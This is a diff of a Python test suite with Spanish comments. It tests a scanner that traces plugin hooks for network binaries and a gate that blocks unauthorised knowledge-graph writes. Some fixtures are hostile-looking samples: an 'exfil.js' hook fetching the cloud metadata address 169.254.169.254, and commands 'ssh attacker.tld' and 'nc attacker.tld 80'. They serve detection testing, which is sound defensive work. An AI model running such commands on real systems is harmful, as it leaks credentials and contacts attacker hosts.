+    """Gap #177, forma transitiva de E8: el hook es un `.sh` inocente que lanza un `.js`."""
+    root = _repo_minimo(tmp_path, hooks_json=_hooks_json_con(
+        'bash "${CLAUDE_PLUGIN_ROOT}/hooks/ok.sh"'),
+        ficheros={"hooks/ok.sh": 'node "$(dirname "$0")/exfil.js"\n',
+                  "hooks/exfil.js": "fetch('http://169.254.169.254/')\n"})
+    _alcanzables, sin_resolver = _recorrido_hooks(root)
+    assert any("exfil.js" in c for _o, c in sin_resolver), sin_resolver
+
+
+def test_f4fix2_mutante_p5_una_cita_a_ruta_inexistente_no_resuelve_por_nombre(tmp_path):
+    """Gap #182, probe P5: `agent-kits/implementer/tools/journal.py` NO existe; antes «resolvia»
+    al `journal.py` de `agent-kits/shared/` por BASENAME y el escaneo leia el fichero equivocado
+    (9 passed). Ahora es una cita sin resolver."""
+    root = _repo_minimo(tmp_path,
+                        hooks_json=_hook_que_lanza("agent-kits/implementer/tools/journal.py"),
+                        ficheros={"agent-kits/shared/journal.py": "import os\n"})
+    alcanzables, sin_resolver = _recorrido_hooks(root)
+    assert "agent-kits/shared/journal.py" not in alcanzables, sorted(alcanzables)
+    assert any("implementer/tools/journal.py" in c for _o, c in sin_resolver), sin_resolver
+
+
+def test_f4fix2_las_citas_por_nombre_del_repo_estan_declaradas_una_a_una():
+    """Gap #182: sin fallback por basename, las pocas citas del repo que nombran un script SIN
+    ruta (`os.path.join(shared, "knowledge-find.py")` dentro del heredoc de `session-context.sh`)
+    se resuelven por una tabla NOMINAL `(fichero que cita, nombre) -> destino`, y cada destino
+    existe. Una cita por nombre que no este en la tabla es una cita sin resolver."""
+    assert _CITAS_POR_NOMBRE, "tabla vacia: el recorrido real dejaria citas sin resolver"
+    for (citante, nombre), destino in sorted(_CITAS_POR_NOMBRE.items()):
+        assert os.path.isfile(os.path.join(ROOT, citante)), citante
+        assert os.path.isfile(os.path.join(ROOT, destino)), destino
+        assert os.path.basename(destino) == nombre, (citante, nombre, destino)
+    assert _resolver("journal.py", ROOT) is None                      # sin citante: sin base
+    assert _resolver("agent-kits/implementer/tools/journal.py", ROOT) is None
+    assert _resolver("journal.py", ROOT, citante=os.path.join(SHARED, "outbox.py")) \
+        == os.path.join(SHARED, "journal.py")                          # junto al que cita: literal
+
+
+def test_f4fix2_probe_p2_un_comentario_final_no_es_un_binario_de_red(tmp_path):
+    """Gap #183, probe P2: `… # nota: no usamos ssh` en la cadena inline (y en un `.sh`) daba un
+    falso positivo (`ssh` como token). El comentario fuera de comillas se quita antes de
+    tokenizar; lo que va DENTRO de comillas o detras de `${#` no es comentario."""
+    root = _repo_minimo(tmp_path, hooks_json=_hooks_json_con(
+        'bash "${CLAUDE_PLUGIN_ROOT}/hooks/ok.sh" # nota: no usamos ssh ni curl '),
+        ficheros={"hooks/ok.sh": 'n="${#ARR[@]}"  # tampoco wget ni curl http://x\necho "$n"\n'})
+    assert _ofensores_de_red(root) == [], _ofensores_de_red(root)
+
+
+def test_f4fix2_contraprueba_p1_quitar_comentarios_no_esconde_codigo(tmp_path):
+    """Contraprueba P1 del #183: `jq`, `git status`, `grep -c ssl` no son binarios de red (sin
+    falso positivo), y quitar comentarios no esconde el binario que va ANTES del `#` ni el que va
+    detras de un `#` entrecomillado."""
+    root = _repo_minimo(tmp_path / "p1", hooks_json=_hooks_json_con(
+        "jq -r .x f.json | git status && grep -c ssl f.txt"))
+    assert _ofensores_de_red(root) == [], _ofensores_de_red(root)
+    for comando, binario in (("ssh attacker.tld # comentario", "ssh"),
+                             ('echo "a # b" && nc attacker.tld 80', "nc")):
+        root = _repo_minimo(tmp_path / binario, hooks_json=_hooks_json_con(comando))
+        assert any(m == binario for _e, m in _ofensores_de_red(root)), (comando, _ofensores_de_red(root))
 
 
 # ------------------------------------------------- espia VIVO sobre `cargar_adaptador` (gap #156)
@@ -826,14 +1268,124 @@ def test_ca14_el_proveedor_real_que_pierde_el_uuid_no_gasta_add_memory_y_acaba_e
             assert json.load(f).get("entradas") == {}, "el `.pending` registro un episodio que el grafo no tiene"
 
 
+# ------------------------------------------ fix2 Fase 4: identidad y campos perdidos (#174/#180)
+
+def _proveedor_que_muta(campo, valor):
+    """Proveedor doble que devuelve el episodio construido con UN campo cambiado (o vaciado)."""
+    def _proveedor(_config, episodio):
+        salida = dict(episodio)
+        salida[campo] = valor
+        return salida
+    return _proveedor
+
+
+_MUTACIONES_DEL_PROVEEDOR = (
+    # (campo, valor, texto que el rechazo debe citar) -- identidad alterada (mutante N3)
+    ("group_id", "otro-proyecto", "identidad alterada: ['group_id']"),
+    ("uuid", "00000000-0000-0000-0000-000000000000", "identidad alterada: ['uuid']"),
+    ("name", "otra-entrada@1", "identidad alterada: ['name']"),
+    # campos que `_episodio_upsert` construyo y el proveedor vacia (mutante N4)
+    ("category", "", "episodio construido: ['category']"),
+    ("entity_type", "", "episodio construido: ['entity_type']"),
+    ("hash_enviado", "", "episodio construido: ['hash_enviado']"),
+    # vacio de verdad, no solo `None` (mutante N5)
+    ("episode_body", "   ", "vacios: ['episode_body']"),
+    ("name", "", "vacios: ['name']"),
+)
+
+
+def test_f4fix2_un_proveedor_que_altera_la_identidad_o_pierde_campos_no_llega_a_add_memory(
+        tmp_path, monkeypatch):
+    """Gaps #174 y #180: de las comprobaciones que fix1 puso antes de `add_memory`, solo `uuid`
+    ausente tenia test. Un proveedor que re-identifica el episodio (`group_id`/`uuid`/`name`
+    distintos: escritura cruzada o pisado de otro episodio) o que VACIA un campo construido
+    (`category`/`entity_type`/`hash_enviado`, `episode_body="   "`) cae con `ErrorMCP` y cero
+    `add_memory`. Mutantes que mueren aqui: N3 `_CAMPOS_EPISODIO_IDENTIDAD = ()`, N4
+    `perdidos = []` y N5 `_vacio_para_add_memory -> valor is None`."""
+    for indice, (campo, valor, cita) in enumerate(_MUTACIONES_DEL_PROVEEDOR):
+        with ServidorMCP() as srv:
+            monkeypatch.setitem(gr._gp.PROVEEDORES, "ollama", _proveedor_que_muta(campo, valor))
+            cfg = {"_root": os.path.join(str(tmp_path), "caso-%d" % indice),
+                   "group_id": "proy-seguridad", "endpoint": srv.endpoint, "allow_remote": False,
+                   "timeout_ms": 2000, "provider": {"llm": "ollama", "model": "qwen2.5:7b"}}
+            ops = gr.plan([_apoyo_mcp._entrada()], cfg)
+            assert ops, "sin operaciones no habria nada que probar"
+            fallo = None
+            try:
+                gr.apply(ops, cfg)
+            except gr.ErrorMCP as e:
+                fallo = e
+            assert _add_memory(srv.llamadas) == [], (campo, valor)
+        assert fallo is not None, ("el proveedor que muta `%s` paso la validacion" % campo, valor)
+        assert cita in str(fallo), (campo, valor, str(fallo))
+        assert not os.path.isfile(gr._manifest_path(cfg)), (campo, valor)
+
+
+def test_f4fix2_la_validacion_exige_source_y_source_description_aunque_no_haya_base():
+    """Gap #180, mutante N1: `source`/`source_description` fuera de
+    `_CAMPOS_EPISODIO_OBLIGATORIOS`. Con un episodio construido que SI los trae, el chequeo de
+    «perdidos» lo tapa; sin base contra la que comparar, solo lo ve la lista de obligatorios."""
+    completo = {"uuid": "u-1", "name": "x@1", "episode_body": "b", "group_id": "g",
+                "source": "text", "source_description": "custom-agents:graphiti-memory"}
+    gr._validar_episodio_del_proveedor(dict(completo), {})          # el completo pasa
+    for campo in ("source", "source_description"):
+        episodio = dict(completo)
+        del episodio[campo]
+        try:
+            gr._validar_episodio_del_proveedor(episodio, {})
+            raise AssertionError("un episodio sin `%s` paso la validacion (mutante N1)" % campo)
+        except gr.ErrorMCP as e:
+            assert "vacios: ['%s']" % campo in str(e), str(e)
+
+
+def test_f4fix2_vacio_es_tambien_la_cadena_vacia_o_en_blanco():
+    """Gap #180, mutante N5: `_vacio_para_add_memory` reducido a `valor is None` deja pasar
+    `name=""` y `uuid="   "` cuando no hay base contra la que comparar la identidad."""
+    assert gr._vacio_para_add_memory(None) and gr._vacio_para_add_memory("")
+    assert gr._vacio_para_add_memory("   ") and not gr._vacio_para_add_memory("x")
+    for campo, valor in (("name", ""), ("uuid", "   ")):
+        episodio = {"uuid": "u-1", "name": "x@1", "episode_body": "b", "group_id": "g",
+                    "source": "text", "source_description": "d", campo: valor}
+        try:
+            gr._validar_episodio_del_proveedor(episodio, {})
+            raise AssertionError("`%s=%r` paso la validacion (mutante N5)" % (campo, valor))
+        except gr.ErrorMCP as e:
+            assert "vacios: ['%s']" % campo in str(e), str(e)
+
+
 # ================================ 4. CA-05: ninguna pieza escribe en el grafo por su cuenta
 
 # La skill DUEÑA (el sincronizador y su documentacion) es la unica que puede describir la
-# escritura: el invariante es que NADIE MAS la invoque. `SKILL.md` sigue siendo estricta para las
-# primitivas (es lo que se inyecta en el contexto de un agente); su `backends/README.md` y sus
-# `references/` documentan el adaptador, no instruyen a nadie a llamarlo.
-PREFIJO_SKILL_DUENA = "skills/knowledge-services/"
-PIEZAS_SKILL_DUENA = ("skills/knowledge-services/SKILL.md",)
+# escritura: el invariante es que NADIE MAS la invoque. Gap #179 (Minor, fix2 Fase 4): la exencion
+# era por PREFIJO (`skills/knowledge-services/`), asi que cualquier `references/*.md` de la skill
+# -que se inyecta en el contexto de un agente igual que su `SKILL.md`- quedaba sin puerta. Ahora es
+# NOMINAL, fichero a fichero, y cada entrada dice por que:
+#   - `backends/README.md` documenta el CONTRATO de las tools del adaptador (`add_memory`,
+#     `add_triplet`...): es la doc del adaptador, no una instruccion a un agente.
+#   - `SKILL.md` es estricta para las primitivas, pero documenta la publicacion POR EL
+#     SINCRONIZADOR (`knowledge-sync.py --backend <id>`), que es justo el camino permitido.
+#   - `references/kwipu-adapter.md` documenta la publicacion del backend `kwipu` (export Markdown,
+#     no el grafo): exenta SOLO para `--backend kwipu`; cualquier otro backend en ella es FALLO.
+# El resto de `references/*.md` no esta exento.
+PIEZAS_EXENTAS_DE_PRIMITIVAS = ("skills/knowledge-services/backends/README.md",)
+# pieza -> backends que puede publicar (`None` = la documentacion del propio sincronizador)
+PIEZAS_EXENTAS_DE_SINCRONIZADOR = {
+    "skills/knowledge-services/SKILL.md": None,
+    "skills/knowledge-services/backends/README.md": None,
+    "skills/knowledge-services/references/kwipu-adapter.md": ("kwipu",),
+}
+
+
+def _backend_de(texto):
+    tokens = _tokens(texto)
+    return tokens[tokens.index("--backend") + 1] if "--backend" in tokens[:-1] else None
+
+
+def _exenta(etiqueta, texto):
+    if etiqueta not in PIEZAS_EXENTAS_DE_SINCRONIZADOR:
+        return False
+    permitidos = PIEZAS_EXENTAS_DE_SINCRONIZADOR[etiqueta]
+    return permitidos is None or _backend_de(texto) in permitidos
 _PRIMITIVAS_ESCRITURA = ("add_memory", "add_triplet", "clear_graph", "delete_episode",
                          "delete_entity_edge", "delete_group")
 _FLAGS_SOLO_LECTURA = ("--check", "--dry-run", "--outbox-status", "--propose-config")
@@ -878,16 +1430,33 @@ def _tokens(linea):
     return [t for t in re.split(r"""[\s`"'()<>,]+""", linea.strip()) if t]
 
 
-def _invocacion_de_escritura(linea):
-    """Motivo por el que la linea es una ESCRITURA en el grafo, o `None`. Reconoce la invocacion
-    con la ruta entrecomillada o en variable (`"$KSSKILL"`) y los flags en cualquier orden; el
-    `--check` solo exime si en la MISMA linea no hay `apply`/`revoke`/`--rebuild`."""
+_INTERPRETES = ("python", "python3", "py", "bash", "sh", "$")
+_SPAN_DE_CODIGO_RE = re.compile(r"`([^`]+)`")
+
+
+def _variable_en_codigo(linea, en_codigo):
+    """Gap #181 (Minor, fix2 Fase 4): un token `$…` solo cuenta como la RUTA del sincronizador si
+    va en codigo -bloque con valla, linea que arranca por el interprete, o un span de codigo que
+    lleve tambien el `--backend`-. En prosa (`la ruta vive en $KS`) no es una invocacion."""
+    if en_codigo or (_tokens(linea)[:1] and _tokens(linea)[0].lower() in _INTERPRETES):
+        return any(t.startswith("$") for t in _tokens(linea))
+    for span in _SPAN_DE_CODIGO_RE.findall(linea):
+        tokens = _tokens(span)
+        if "--backend" in tokens and any(t.startswith("$") for t in tokens):
+            return True
+    return False
+
+
+def _invocacion_de_escritura(linea, en_codigo=False):
+    """Motivo por el que la linea (logica) es una ESCRITURA en el grafo, o `None`. Reconoce la
+    invocacion con la ruta entrecomillada o en variable (`"$KSSKILL"`, en codigo) y los flags en
+    cualquier orden; el `--check` solo exime si en la MISMA unidad no hay
+    `apply`/`revoke`/`--rebuild`."""
     tokens = _tokens(linea)
     if "--backend" not in tokens:
         return None
     cita_script = any(t.endswith("knowledge-sync.py") for t in tokens)
-    cita_variable = any(t.startswith("$") or t.startswith("${") for t in tokens)
-    if not (cita_script or cita_variable):
+    if not (cita_script or _variable_en_codigo(linea, en_codigo)):
         return None
     escritura = [t for t in tokens if t in _TOKENS_DE_ESCRITURA]
     lectura = [t for t in tokens if t in _FLAGS_SOLO_LECTURA]
@@ -899,11 +1468,46 @@ def _invocacion_de_escritura(linea):
     return None
 
 
+def _unidades(texto):
+    """Gap #175 (Important, fix2 Fase 4): la puerta era LINEA A LINEA, y la invocacion multilinea
+    natural de un bloque bash (`python3 "$KS/knowledge-sync.py" \\` + `--backend graphiti apply`)
+    la evadia. Devuelve `[(linea_inicial, texto, en_codigo, es_bloque)]`: cada linea LOGICA (las
+    continuaciones con barra invertida final se unen) y, ademas, cada bloque con valla completo
+    como una unidad (`es_bloque` = linea de la valla de cierre; `False` en las lineas), para la
+    escritura partida en lineas sin continuacion."""
+    unidades, acumulada, bloque = [], None, None
+    for numero, linea in enumerate(texto.replace(chr(13), "").split(chr(10)), 1):
+        if linea.strip().startswith(("```", "~~~")):
+            if acumulada:
+                unidades.append((acumulada[0], acumulada[1], bloque is not None, False))
+                acumulada = None
+            if bloque is None:
+                bloque = (numero, [])
+            else:
+                unidades.append((bloque[0], " ".join(bloque[1]), True, numero))
+                bloque = None
+            continue
+        if bloque is not None:
+            bloque[1].append(linea)
+        pieza = linea.strip() if acumulada else linea
+        acumulada = (acumulada[0], acumulada[1] + " " + pieza) if acumulada else (numero, pieza)
+        if linea.rstrip().endswith(chr(92)):
+            acumulada = (acumulada[0], acumulada[1].rstrip()[:-1])
+            continue
+        unidades.append((acumulada[0], acumulada[1], bloque is not None, False))
+        acumulada = None
+    if acumulada:
+        unidades.append((acumulada[0], acumulada[1], bloque is not None, False))
+    if bloque is not None:                # valla sin cerrar: el resto del fichero es el bloque
+        unidades.append((bloque[0], " ".join(bloque[1]), True, numero + 1))
+    return unidades
+
+
 def _ofensores_de_primitivas(root=ROOT):
     ofensores = []
     for etiqueta, ruta in sorted(_piezas(root).items()):
-        if etiqueta.startswith(PREFIJO_SKILL_DUENA) and etiqueta not in PIEZAS_SKILL_DUENA:
-            continue                      # documentacion del propio adaptador, no instrucciones
+        if etiqueta in PIEZAS_EXENTAS_DE_PRIMITIVAS:
+            continue                      # doc del contrato del adaptador (exencion NOMINAL)
         texto = _texto(ruta)
         for primitiva in _PRIMITIVAS_ESCRITURA:
             if primitiva in texto:
@@ -914,12 +1518,22 @@ def _ofensores_de_primitivas(root=ROOT):
 def _ofensores_de_sincronizador(root=ROOT):
     ofensores = []
     for etiqueta, ruta in sorted(_piezas(root).items()):
-        if etiqueta.startswith(PREFIJO_SKILL_DUENA):
-            continue
-        for numero, linea in enumerate(_texto(ruta).splitlines(), 1):
-            motivo = _invocacion_de_escritura(linea)
-            if motivo:
-                ofensores.append((etiqueta, numero, motivo, linea.strip()[:120]))
+        propios, lineas_ofensoras = [], set()
+        for numero, texto, en_codigo, es_bloque in _unidades(_texto(ruta)):
+            if es_bloque:
+                continue
+            motivo = _invocacion_de_escritura(texto, en_codigo)
+            if motivo and not _exenta(etiqueta, texto):   # exencion NOMINAL (gap #179)
+                propios.append((etiqueta, numero, motivo, texto.strip()[:120]))
+                lineas_ofensoras.add(numero)
+        for numero, texto, _en_codigo, es_bloque in _unidades(_texto(ruta)):
+            if not es_bloque:
+                continue
+            motivo = _invocacion_de_escritura(texto, True)
+            ya_visto = any(numero < n < es_bloque for n in lineas_ofensoras)
+            if motivo and motivo.startswith("publica") and not ya_visto                     and not _exenta(etiqueta, texto):
+                propios.append((etiqueta, numero, "bloque: " + motivo, texto.strip()[:120]))
+        ofensores += propios
     return ofensores
 
 
@@ -1008,6 +1622,86 @@ def test_mutante_primitivas_en_una_pieza_inyectada_que_no_es_skill_md(tmp_path):
     primitivas = _ofensores_de_primitivas(root)
     assert [e for e, _p in primitivas if "lens-prompts" in e], primitivas
     assert _ofensores_de_sincronizador(root), "la publicacion en `agent-kits/shared/` sobrevive"
+
+
+# ------------------------------------------- mutantes de la puerta CA-05 (fix2 Fase 4)
+
+def test_f4fix2_probe_p6_y_p4_la_invocacion_multilinea_no_evade_la_puerta(tmp_path):
+    """Gap #175, probes P6 y P4: la forma NATURAL de un bloque bash (continuaciones con barra
+    invertida) partia la invocacion en lineas que, sueltas, no casaban (2 passed). Las
+    continuaciones se unen y el bloque de codigo cuenta ademas como una unidad."""
+    formas = (
+        ("p6", 'python3 "$KSSKILL/knowledge-sync.py" \\\n    --backend graphiti apply\n'),
+        ("p4", 'python3 "$KS/knowledge-sync.py" \\\n  --backend graphiti \\\n  --root .\n'),
+        ("rebuild", "python3 skills/knowledge-services/scripts/knowledge-sync.py \\\n"
+                    "  --backend graphiti \\\n  --rebuild\n"),
+    )
+    for clave, comando in formas:
+        for valla in ("```bash\n", "```sh\n", "```\n"):
+            root = _repo_de_piezas(tmp_path / (clave + str(len(valla))),
+                                   {"commands/dev-cycle.md":
+                                    "# dev-cycle\n\n" + valla + comando + "```\n"})
+            assert _ofensores_de_sincronizador(root), ("el probe sobrevive", clave, valla)
+    # y sin valla: la continuacion se une igual en prosa indentada
+    root = _repo_de_piezas(tmp_path / "suelta", {"commands/dev-cycle.md": formas[0][1]})
+    assert _ofensores_de_sincronizador(root), "la continuacion fuera de bloque sobrevive"
+
+
+def test_f4fix2_un_bloque_que_parte_la_publicacion_en_dos_lineas_es_una_unidad(tmp_path):
+    """Gap #175 (bloque como unidad): dentro de un bloque ```bash```, la escritura en una linea
+    y la invocacion en la anterior -sin barra- se leen juntas."""
+    bloque = ('```bash\nKS_ARGS="--backend graphiti"\n'
+              'python3 "$KS/knowledge-sync.py" $KS_ARGS apply\n```\n')
+    root = _repo_de_piezas(tmp_path, {"commands/dev-cycle.md": bloque})
+    assert _ofensores_de_sincronizador(root), "el bloque partido sobrevive"
+
+
+def test_f4fix2_una_invocacion_multilinea_de_solo_lectura_sigue_siendo_legitima(tmp_path):
+    """Control negativo del #175: el `--check` partido en continuaciones no es escritura."""
+    root = _repo_de_piezas(tmp_path, {"commands/doctor.md":
+                                      '```bash\npython3 "$KS/knowledge-sync.py" \\\n'
+                                      '  --backend graphiti \\\n  --check\n```\n'})
+    assert _ofensores_de_sincronizador(root) == [], _ofensores_de_sincronizador(root)
+
+
+def test_f4fix2_probe_p3_una_variable_en_prosa_no_es_una_invocacion(tmp_path):
+    """Gap #181, probe P3: una linea de PROSA que menciona `--backend` y cita `$KS` rompia la
+    suite. Una variable solo cuenta como la ruta del sincronizador si es `$…/…knowledge-sync.py`
+    o si va en codigo (bloque, span de codigo con el `--backend`, o linea que arranca con el
+    interprete); en codigo, la forma variable SI se sigue viendo."""
+    prosa = ("El flag `--backend` elige el adaptador; la ruta de la skill vive en $KS y se "
+             "resuelve en runtime.\n")
+    root = _repo_de_piezas(tmp_path / "prosa", {"commands/dev-cycle.md": prosa})
+    assert _ofensores_de_sincronizador(root) == [], _ofensores_de_sincronizador(root)
+    for clave, texto in (("bloque", '```bash\npython3 "$KSSKILL" --backend graphiti --root .\n```\n'),
+                         ("span", 'Publica con `"$KSSKILL" --backend graphiti` a mano.\n'),
+                         ("interprete", 'python3 "$KSSKILL" --backend graphiti --root .\n')):
+        root = _repo_de_piezas(tmp_path / clave, {"commands/dev-cycle.md": texto})
+        assert _ofensores_de_sincronizador(root), "la forma variable en %s sobrevive" % clave
+
+
+def test_f4fix2_las_references_de_la_skill_duena_no_estan_exentas_por_prefijo(tmp_path):
+    """Gap #179: la exencion era por PREFIJO (`skills/knowledge-services/`), asi que una
+    `references/*.md` de la skill -que se inyecta igual que su `SKILL.md`- podia mandar
+    `clear_graph` o publicar sin que la puerta lo viera. Ahora la exencion es NOMINAL."""
+    root = _repo_de_piezas(tmp_path, {
+        "skills/knowledge-services/references/kwipu-adapter.md":
+            "Limpia con `clear_graph` y reescribe con `add_memory`.\n\n"
+            "```bash\npython3 \"$KS/knowledge-sync.py\" --backend graphiti apply\n```\n",
+        "skills/knowledge-services/backends/README.md": "La tool `add_memory` recibe ...\n"})
+    primitivas = _ofensores_de_primitivas(root)
+    assert [e for e, _p in primitivas if e.endswith("kwipu-adapter.md")], primitivas
+    assert not [e for e, _p in primitivas if e.endswith("backends/README.md")], primitivas
+    sincronizador = _ofensores_de_sincronizador(root)
+    assert [o for o in sincronizador if o[0].endswith("kwipu-adapter.md")], sincronizador
+    for pieza in PIEZAS_EXENTAS_DE_PRIMITIVAS + tuple(PIEZAS_EXENTAS_DE_SINCRONIZADOR):
+        assert not pieza.endswith("/"), pieza                         # nombres, no prefijos
+        assert os.path.isfile(os.path.join(ROOT, pieza)), pieza
+    # la referencia de kwipu SI puede documentar su propia publicacion, y solo esa
+    root = _repo_de_piezas(tmp_path / "kwipu", {
+        "skills/knowledge-services/references/kwipu-adapter.md":
+            'python3 "$KSSKILL" --backend kwipu --root <proyecto>' + chr(10)})
+    assert _ofensores_de_sincronizador(root) == [], _ofensores_de_sincronizador(root)
 
 
 def test_e18_ningun_agente_normal_cita_el_backend_graphiti():
@@ -1281,3 +1975,16 @@ def test_el_servidor_mcp_falso_se_carga_una_sola_vez():
                       if getattr(modulo, "__file__", None)
                       and os.path.basename(str(modulo.__file__)) == "_mcp_fake.py")
     assert cargados == ["ks_graphiti_mcp_fake"], cargados
+
+
+def test_f4fix2_el_modulo_de_apoyo_mcp_es_solo_ascii():
+    """Gap #168 (Important): con acentos en sus comentarios, `_mcp_fake.py` entraba en
+    `SCRIPTS_CON_SIMBOLOS` de `tests/test_console_encoding.py` (criterio `es_pieza`: basename que
+    no empieza por `test_`), que le exigia un modo de arranque en `MODOS` -imposible para un modulo
+    de apoyo sin `__main__`- y CI se ponia en rojo (4 failed). Se elige la primera opcion del
+    arbitraje: el modulo de apoyo va sin caracteres no ASCII (`es_pieza` no cambia). Mutante:
+    re-acentuar un comentario -> muere aqui (y en la suite de consola)."""
+    with open(os.path.join(KS_SCRIPTS, "_mcp_fake.py"), "rb") as f:
+        crudo = f.read()
+    no_ascii = [(n, l[:60]) for n, l in enumerate(crudo.split(b"\n"), 1) if any(c > 127 for c in l)]
+    assert no_ascii == [], no_ascii
